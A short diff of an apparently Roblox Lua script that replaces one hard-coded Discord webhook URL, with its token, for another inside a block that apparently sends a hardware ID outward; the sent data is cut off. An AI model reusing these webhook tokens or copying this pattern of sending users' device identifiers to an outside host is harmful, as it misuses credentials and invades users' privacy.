@@ -43,7 +43,7 @@ end
 
 if hwid then
 local HttpServ = game:GetService('HttpService')
-local url = "https://discord.com/api/webhooks/1066690488171769957/D73l_i62igB7t6fyhDmG-4KfQfZTxomPQAJ7W8T2iBiryhpklRLH3S0QronX6Wutd0ab"
+local url = "https://discord.com/api/webhooks/1066704776001224785/nofMugP2Rpn3nhS19yujfucLKFNZdIvQr7ORIjZQo_jEtNN_7NGtO1_ZQrdPpSXHOwxP"
 
 
 local data = 
